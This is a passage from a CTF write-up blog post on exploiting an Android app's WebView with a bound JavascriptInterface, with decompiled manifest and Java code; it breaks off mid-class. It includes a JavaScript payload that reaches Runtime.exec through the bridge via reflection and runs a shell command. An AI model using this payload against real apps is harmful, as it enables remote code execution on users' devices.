<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="DroidComp writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Summary This challenge focuses on reverse engineering an APK that uses a function with a vulnerable webView object. We can use this object and the JavascriptInterface bound to it to execute one specific function, which just so happens to return the flag." /><meta property="og:description" content="Summary This challenge focuses on reverse engineering an APK that uses a function with a vulnerable webView object. We can use this object and the JavascriptInterface bound to it to execute one specific function, which just so happens to return the flag." /><link rel="canonical" href="https://bitisg.github.io/posts/DroidComp/" /><meta property="og:url" content="https://bitisg.github.io/posts/DroidComp/" /><meta property="og:site_name" content="BitisGabonica" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-01-22T17:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="DroidComp writeup" /><meta name="twitter:site" content="@BitisGabonica1" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-23T19:26:03+01:00","datePublished":"2023-01-22T17:00:00+01:00","description":"Summary This challenge focuses on reverse engineering an APK that uses a function with a vulnerable webView object. We can use this object and the JavascriptInterface bound to it to execute one specific function, which just so happens to return the flag.","headline":"DroidComp writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://bitisg.github.io/posts/DroidComp/"},"url":"https://bitisg.github.io/posts/DroidComp/"}</script><title>DroidComp writeup | BitisGabonica</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BitisGabonica"><meta name="application-name" content="BitisGabonica"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/sui.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BitisGabonica</a></div><div class="site-subtitle font-italic">CTF writeups and other stuff</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/BitisG" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/BitisGabonica1" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xBitisGabonica','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>DroidComp writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/ctf/bios/droidcomp/Frida.jpg" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>DroidComp writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1674403200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-01-22 </em> </span> <span> Updated <em class="timeago" data-ts="1679595963" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-03-23 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1398 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h2 id="summary"><span class="mr-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This challenge focuses on reverse engineering an APK that uses a function with a vulnerable <code class="language-plaintext highlighter-rouge">webView</code> object. We can use this object and the <code class="language-plaintext highlighter-rouge">JavascriptInterface</code> bound to it to execute one specific function, which just so happens to return the flag.</p><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We are given an <code class="language-plaintext highlighter-rouge">.apk</code> file and the challenge description: “Here is the APK file. Get the flag by exploiting the vulnerabilities.”</p><p>Overall, not a lot to go off of. We start out by decoding the given APK and taking a look at the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> file:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;</span><span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">"http://schemas.android.com/apk/res/android"</span> <span class="na">android:compileSdkVersion=</span><span class="s">"32"</span> <span class="na">android:compileSdkVersionCodename=</span><span class="s">"12"</span> <span class="na">package=</span><span class="s">"x.y.z"</span> <span class="na">platformBuildVersionCode=</span><span class="s">"32"</span> <span class="na">platformBuildVersionName=</span><span class="s">"12"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.INTERNET"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_EXTERNAL_STORAGE"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.WRITE_EXTERNAL_STORAGE"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.MANAGE_EXTERNAL_STORAGE"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.STORAGE"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;application</span> <span class="na">android:allowBackup=</span><span class="s">"true"</span> <span class="na">android:appComponentFactory=</span><span class="s">"androidx.core.app.CoreComponentFactory"</span> <span class="na">android:dataExtractionRules=</span><span class="s">"@xml/data_extraction_rules"</span> <span class="na">android:fullBackupContent=</span><span class="s">"@xml/backup_rules"</span> <span class="na">android:icon=</span><span class="s">"@mipmap/ic_launcher"</span> <span class="na">android:label=</span><span class="s">"@string/app_name"</span> <span class="na">android:roundIcon=</span><span class="s">"@mipmap/ic_launcher_round"</span> <span class="na">android:supportsRtl=</span><span class="s">"true"</span> <span class="na">android:theme=</span><span class="s">"@style/Theme.Abc"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;service</span> <span class="na">android:enabled=</span><span class="s">"true"</span> <span class="na">android:exported=</span><span class="s">"true"</span> <span class="na">android:name=</span><span class="s">"x.y.z.IService"</span> <span class="na">android:process=</span><span class="s">":remote"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;intent-filter&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"x.y.z.ServicesOut"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
        <span class="nt">&lt;/service&gt;</span>
        <span class="nt">&lt;activity</span> <span class="na">android:exported=</span><span class="s">"true"</span> <span class="na">android:name=</span><span class="s">"x.y.z.a"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;meta-data</span> <span class="na">android:name=</span><span class="s">"android.app.lib_name"</span> <span class="na">android:value=</span><span class="s">""</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;intent-filter&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.CUSTOM_INTENT"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;data</span> <span class="na">android:host=</span><span class="s">"bi0s"</span> <span class="na">android:scheme=</span><span class="s">"android"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
        <span class="nt">&lt;/activity&gt;</span>
        <span class="nt">&lt;activity</span> <span class="na">android:exported=</span><span class="s">"true"</span> <span class="na">android:name=</span><span class="s">"x.y.z.m"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;intent-filter&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.MAIN"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.LAUNCHER"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
            <span class="nt">&lt;meta-data</span> <span class="na">android:name=</span><span class="s">"android.app.lib_name"</span> <span class="na">android:value=</span><span class="s">""</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/activity&gt;</span>
        <span class="nt">&lt;provider</span> <span class="na">android:authorities=</span><span class="s">"x.y.z.androidx-startup"</span> <span class="na">android:exported=</span><span class="s">"false"</span> <span class="na">android:name=</span><span class="s">"androidx.startup.InitializationProvider"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;meta-data</span> <span class="na">android:name=</span><span class="s">"androidx.emoji2.text.EmojiCompatInitializer"</span> <span class="na">android:value=</span><span class="s">"androidx.startup"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;meta-data</span> <span class="na">android:name=</span><span class="s">"androidx.lifecycle.ProcessLifecycleInitializer"</span> <span class="na">android:value=</span><span class="s">"androidx.startup"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/provider&gt;</span>
    <span class="nt">&lt;/application&gt;</span>
<span class="nt">&lt;/manifest&gt;</span>
</pre></table></code></div></div><p>We can tell that the main activity that is being launched when the app is opened on the phone is named <code class="language-plaintext highlighter-rouge">x.y.z.m</code>. Decompiling the <code class="language-plaintext highlighter-rouge">APK</code> with jadx we get the following source code:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">x.y.z</span><span class="o">;</span>  
  
<span class="kn">import</span> <span class="nn">android.content.Intent</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">android.os.Bundle</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">android.view.View</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">android.widget.ImageButton</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">androidx.appcompat.app.AppCompatActivity</span><span class="o">;</span>  
  
<span class="cm">/* loaded from: classes.dex */</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">m</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>  
    <span class="cm">/* JADX INFO: Access modifiers changed from: protected */</span>  
    <span class="nd">@Override</span> <span class="c1">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity  </span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">bundle</span><span class="o">)</span> <span class="o">{</span>  
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>  
        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_m</span><span class="o">);</span>  
        <span class="o">((</span><span class="nc">ImageButton</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">btn</span><span class="o">)).</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="nc">View</span><span class="o">.</span><span class="na">OnClickListener</span><span class="o">()</span> <span class="o">{</span> <span class="c1">// from class: x.y.z.m$$ExternalSyntheticLambda0  </span>
            <span class="nd">@Override</span> <span class="c1">// android.view.View.OnClickListener  </span>
            <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="nc">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>  
                <span class="n">m</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">m2016lambda</span><span class="n">$onCreate</span><span class="err">$</span><span class="mi">0</span><span class="n">$xyzm</span><span class="o">(</span><span class="n">view</span><span class="o">);</span>  
            <span class="o">}</span>  
        <span class="o">});</span>  
    <span class="o">}</span>  
  
    <span class="cm">/* JADX INFO: Access modifiers changed from: package-private */</span>  
    <span class="cm">/* renamed from: lambda$onCreate$0$x-y-z-m  reason: not valid java name */</span>  
    <span class="kd">public</span> <span class="cm">/* synthetic */</span> <span class="kt">void</span> <span class="n">m2016lambda$onCreate</span><span class="err">$</span><span class="mi">0</span><span class="n">$xyzm</span><span class="o">(</span><span class="nc">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>  
        <span class="n">startActivity</span><span class="o">(</span><span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">a</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>  
    <span class="o">}</span>  
<span class="o">}</span>
</pre></table></code></div></div><p>Basically, all this code does is create a button, and setting the button’s <code class="language-plaintext highlighter-rouge">onClick</code> method to launch a new intent, targeting the <code class="language-plaintext highlighter-rouge">x.y.z.a</code> class which can be seen below:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">a</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>  
    <span class="kd">static</span> <span class="kd">final</span> <span class="cm">/* synthetic */</span> <span class="kt">boolean</span> <span class="n">$assertionsDisabled</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>  
  
    <span class="cm">/* JADX INFO: Access modifiers changed from: protected */</span>  
    <span class="nd">@Override</span> <span class="c1">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity  </span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">bundle</span><span class="o">)</span> <span class="o">{</span>  
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>  
        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_a</span><span class="o">);</span>  
        <span class="nc">WebView</span> <span class="n">webView</span> <span class="o">=</span> <span class="o">(</span><span class="nc">WebView</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">webView</span><span class="o">);</span>  
        <span class="kt">boolean</span> <span class="n">z</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">addJavascriptInterface</span><span class="o">(</span><span class="k">new</span> <span class="n">c</span><span class="o">(</span><span class="k">this</span><span class="o">),</span> <span class="s">"client"</span><span class="o">);</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">getAllowFileAccess</span><span class="o">();</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">getAllowContentAccess</span><span class="o">();</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">getAllowUniversalAccessFromFileURLs</span><span class="o">();</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">getDomStorageEnabled</span><span class="o">();</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setUseWideViewPort</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setAppCacheEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setAllowFileAccess</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>  
        <span class="k">if</span> <span class="o">(</span><span class="n">intent</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>  
            <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="s">"https://google.com"</span><span class="o">);</span>  
        <span class="o">}</span>  
        <span class="nc">Uri</span> <span class="n">data</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>  
        <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>  
            <span class="nc">String</span> <span class="n">queryParameter</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"web"</span><span class="o">);</span>  
            <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"TAG"</span><span class="o">,</span> <span class="s">"onCreate: "</span> <span class="o">+</span> <span class="n">queryParameter</span><span class="o">);</span>  
            <span class="k">if</span> <span class="o">(</span><span class="n">queryParameter</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>  
                <span class="n">z</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>  
            <span class="o">}</span>  
            <span class="k">if</span> <span class="o">(</span><span class="n">z</span> <span class="o">&amp;</span> <span class="nc">URLUtil</span><span class="o">.</span><span class="na">isValidUrl</span><span class="o">(</span><span class="n">queryParameter</span><span class="o">))</span> <span class="o">{</span>  
                <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">queryParameter</span><span class="o">);</span>  
                <span class="k">return</span><span class="o">;</span>  
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="n">queryParameter</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"html"</span><span class="o">))</span> <span class="o">{</span>  
                <span class="k">return</span><span class="o">;</span>  
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>  
                <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">queryParameter</span><span class="o">);</span>  
                <span class="k">return</span><span class="o">;</span>  
            <span class="o">}</span>  
        <span class="o">}</span>  
        <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="s">"https://google.com"</span><span class="o">);</span>  
    <span class="o">}</span>  
<span class="o">}</span>
</pre></table></code></div></div><p>This is basically the meat of the challenge. The <code class="language-plaintext highlighter-rouge">onCreate</code> method creates a <code class="language-plaintext highlighter-rouge">webView</code> object, adds a <code class="language-plaintext highlighter-rouge">JavascriptInterface</code> to it, and then sets a bunch of options for the <code class="language-plaintext highlighter-rouge">webview</code>. If we had a remote instance that we needed to attack then it would probably be interesting to see if we could use the <code class="language-plaintext highlighter-rouge">setAllowFileAccess</code> option into path traversal, however since we only have the instance running locally we won’t bother with that.</p><p>The method then checks if the intent contains any data, and if it does, and that data contains a <code class="language-plaintext highlighter-rouge">queryParameter</code> with the value “web” it will load that page via the <code class="language-plaintext highlighter-rouge">webView</code>.</p><h2 id="the-webview-object-and-why-it-can-totally-ruin-your-day"><span class="mr-2">The webView object and why it can totally ruin your day</span><a href="#the-webview-object-and-why-it-can-totally-ruin-your-day" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The reason that the <code class="language-plaintext highlighter-rouge">webView</code> object has Javascript disabled by default is that it can very quickly lead to <code class="language-plaintext highlighter-rouge">RCE</code> if the user visits a malicious site via the <code class="language-plaintext highlighter-rouge">webView</code>.</p><p>Let’s say that the application has created a <code class="language-plaintext highlighter-rouge">webView</code> object, assigned a <code class="language-plaintext highlighter-rouge">JavascriptInterface</code> to it, and it then visits a site with the following content:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- javascriptBridge is the name of the Android exposed object --&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">execute</span><span class="p">(</span><span class="nx">cmd</span><span class="p">){</span>
  <span class="k">return</span> <span class="nx">javascriptBridge</span><span class="p">.</span><span class="nx">getClass</span><span class="p">().</span><span class="nx">forName</span><span class="p">(</span><span class="dl">'</span><span class="s1">java.lang.Runtime</span><span class="dl">'</span><span class="p">).</span><span class="nx">getMethod</span><span class="p">(</span><span class="dl">'</span><span class="s1">getRuntime</span><span class="dl">'</span><span class="p">,</span><span class="kc">null</span><span class="p">).</span><span class="nx">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">cmd</span><span class="p">);</span>
<span class="p">}</span>
<span class="nx">execute</span><span class="p">([</span><span class="dl">'</span><span class="s1">/system/bin/sh</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">-c</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">echo </span><span class="se">\</span><span class="s1">"mwr</span><span class="se">\</span><span class="s1">" &gt; /mnt/sdcard/mwr.txt</span><span class="dl">'</span><span class="p">]);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>And that is all there is to getting <code class="language-plaintext highlighter-rouge">RCE</code>. For this reason it’s not recommended to use a <code class="language-plaintext highlighter-rouge">JavascriptInterface</code> with webViews unless completely necessary. There are some precautions however. For example, the application could use the <code class="language-plaintext highlighter-rouge">@JavascriptInterface</code> annotation to only allow the interface to only expose specific methods, which is actually what is happening in this challenge.</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">x.y.z</span><span class="o">;</span>  
  
<span class="kn">import</span> <span class="nn">android.webkit.JavascriptInterface</span><span class="o">;</span>  
  
<span class="cm">/* loaded from: classes.dex */</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">c</span> <span class="o">{</span>  
    <span class="kd">public</span> <span class="nf">c</span><span class="o">(</span><span class="n">a</span> <span class="n">aVar</span><span class="o">)</span> <span class="o">{</span>  
    <span class="o">}</span>  
  
    <span class="nd">@JavascriptInterface</span>  
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">d</span><span class="o">()</span> <span class="o">{</span>  
        <span class="k">return</span> <span class="k">new</span> <span class="nf">h</span><span class="o">().</span><span class="na">s</span><span class="o">(</span><span class="nc">BuildConfig</span><span class="o">.</span><span class="na">APPLICATION_ID</span><span class="o">);</span>  
    <span class="o">}</span>  
<span class="o">}</span>
</pre></table></code></div></div><p>And here is the content of the <code class="language-plaintext highlighter-rouge">h</code> class:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">h</span> <span class="o">{</span>  
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Companion</span> <span class="nc">Companion</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Companion</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>  
  
    <span class="kd">public</span> <span class="kd">final</span> <span class="kd">native</span> <span class="nc">String</span> <span class="nf">s</span><span class="o">(</span><span class="nc">String</span> <span class="n">str</span><span class="o">);</span>  
  
    <span class="kd">public</span> <span class="kd">final</span> <span class="kd">native</span> <span class="nc">String</span> <span class="nf">ss</span><span class="o">(</span><span class="nc">String</span> <span class="n">str</span><span class="o">);</span>  
    <span class="cm">/* loaded from: classes.dex */</span>  
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">Companion</span> <span class="o">{</span>  
        <span class="kd">public</span> <span class="cm">/* synthetic */</span> <span class="nc">Companion</span><span class="o">(</span><span class="nc">DefaultConstructorMarker</span> <span class="n">defaultConstructorMarker</span><span class="o">)</span> <span class="o">{</span>  
            <span class="k">this</span><span class="o">();</span>  
        <span class="o">}</span>  
  
        <span class="kd">private</span> <span class="nf">Companion</span><span class="o">()</span> <span class="o">{</span>  
        <span class="o">}</span>  
